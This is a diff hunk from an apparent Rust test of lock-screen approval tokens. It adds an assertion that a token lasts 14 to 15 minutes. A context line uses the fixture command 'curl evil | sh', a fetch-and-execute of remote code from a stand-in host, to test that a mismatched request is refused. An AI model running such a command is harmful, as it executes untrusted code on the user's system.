@@ -317,6 +317,13 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
         .unwrap();
     let mut other =
         push::verify_token(&daemon.daemon_id().0, &token, proto::UnixMillis(0)).unwrap();
+    // A notification left on a lock screen approves for 15 minutes at most.
+    let now = client_core::now_millis().0;
+    let left = other.expires.0.saturating_sub(now);
+    assert!(
+        (14 * 60_000..=15 * 60_000).contains(&left),
+        "token lasts {left} ms"
+    );
     other.subject = push::request_subject("another", Some("Bash"), "curl evil | sh");
     let mismatched = send_action(
         &ticket_a,
